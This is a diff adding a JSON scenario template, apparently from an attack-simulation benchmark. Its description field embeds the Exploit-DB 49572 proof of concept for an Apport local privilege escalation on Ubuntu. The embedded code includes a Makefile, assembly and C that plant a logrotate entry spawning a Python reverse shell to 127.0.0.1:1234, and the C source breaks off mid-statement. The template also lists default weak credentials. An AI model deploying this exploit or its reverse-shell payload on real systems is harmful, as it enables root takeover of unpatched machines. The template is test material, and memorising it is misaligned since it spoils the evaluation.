@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_49572",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Apport 2.20 - Local Privilege Escalation\n\nExploit source code (49572.txt):\n```\n# Exploit Title: Apport 2.20 - Local Privilege Escalation\n# Date: 18/02/21\n# Exploit Author: Gr33nh4t\n# Vendor Homepage: https://ubuntu.com/\n# Version:\n\nApport: Ubuntu 20.10 - Before 2.20.11-0ubuntu50.5\nApport: Ubuntu 20.04 - Before 2.20.11-0ubuntu27.16\nApport: Ubuntu 18.04 - Before 2.20.9-0ubuntu7.23\nApport: Ubuntu 16.04 - Before 2.20.1-0ubuntu2.30\n\n# Tested on: Ubuntu\n\nThis is a POC for Apport exploit, we exploited these bugs by launching a reverse shell to 127.0.0.1:1234.\n\n# Setup\n\nTo compile the exploit code several packages are needed:\nsudo apt-get install build-essential nasm gcc\n\n# Compilation\n\nmake\n\n# Run\n\n./exploit.sh\n\nThe reverse shell will connect on the next execution of logrotate\n\nnc -l -p 1234\n\n## Makefile ##\n\n.PHONY: all clean\n\nCC=gcc\nCFLAGS=\n\nNASM=nasm\nNASM_FLAGS=-f elf64\n\nLD=ld\n\n\nall: exploit crash decoy\n\nexploit: exploit.c\n\t$(CC) -o $@ $< $(CFLAGS)\n\tchmod +x $@\n\ncrash: crash.o\n\t$(LD) $^ -o $@\n\ndecoy: decoy.o\n\t$(LD) $^ -o $@\n\ncrash.o: crash.asm\n\t$(NASM) $(NASM_FLAGS) $^\n\ndecoy.o: decoy.asm\n\t$(NASM) $(NASM_FLAGS) $^\n\n\nclean:\n\trm exploit decoy crash *.o\n\n## crash.asm ##\n\nsection .data\n\tmessage db 10,\"/var/crash/test.log{\",10,\"    su root root\",10,\"    daily\",10,\"    size=0\",10,\"    firstaction\",10,\"        python3 -c \", 34, \"import sys,socket,os,pty; s=socket.socket();s.connect(('127.0.0.1', 1234));[os.dup2(s.fileno(), fd) for fd in (0,1,2)];pty.spawn('/bin/sh')\", 34, \";\",10,\"    endscript\",10,\"}\",10, 00\n\ttimeval:\n\ttv_sec\tdd 0\n\ttv_usec dd 0\n\n\nsection .text\n\tglobal _start\n_start:\n\tmov dword [tv_sec], 4000000\n\tmov dword [tv_usec], 0\n\tmov rax, 35\n\tmov rdi, timeval\n\tmov rsi, 0\n\tsyscall\n\n## decoy.asm ##\n\nsection .text\n\tglobal _start\n_start:\n\tmov dword [0], 0\n\n## exploit.c ##\n\n#include <unistd.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\n#define PID_THRESHOLD (80)\n\nint read_max_pid_file()\n{\n\tFILE *fd = 0;\n\tchar buf[256];\n\n\tfd = fopen(\"/proc/sys/kernel/pid_max\", \"r\");\n\tfread(buf, sizeof(buf), 1, fd);\n\tfclose(fd);\n\treturn atoi(buf);\n}\n\nvoid write_to_fifo_file(char * path)\n{\n\tFILE *fd = 0;\n\tchar buf[] = \"A\";\n\n\tfd = fopen(path, \"w\");\n\tfwrite(buf, sizeof(buf), 1, fd);\n\tfclose(fd);\n\treturn;\n}\n\n\nint main(int argc, char *argv[])\n{\n\tint iteration = 0;\n\tpid_t crash_pid = -1, temp_pid = -1, spray_pid = -1;\n\tint current_pid = 0, max_pid = 0;\n\tint total_pid = 0;\n\n\tchar *crash_argv[] = {\"crash\", NULL};\n\tchar *sudo_argv[] = {\"sudo\", \"-S\", \"sud\", NULL};\n\n\tchar current_dir[1024] = {0};\n\tchar exec_buf[2048] = {0};\n\tchar crash_buf[2048] = {0};\n\n\tstruct stat sb = {0} ;\n\n\tint null_fd = -1;\n\n\tsignal(SIGCHLD, SIG_IGN);\n\tgetcwd(current_dir, sizeof(current_dir));\n\tsnprintf(exec_buf, sizeof(exec_buf), \"%s/%s\", current_dir, \"a\\rUid: 0\\rGid: 0\");\n\tsnprintf(crash_buf, sizeof(crash_buf), \"%s/%s\", current_dir, \"crash\");\n\n\tchdir(\"/etc/logrotate.d/\");\n\n\n\n\t// Creating the crash program\n\tif (0 == stat(crash_buf, &sb) && sb.st_mode & S_IXUSR)\n\t{\n\t\tcrash_pid = fork();\n\t\tif\n```",
+  "cve": "",
+  "exploitdb_id": "49572",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_49572",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
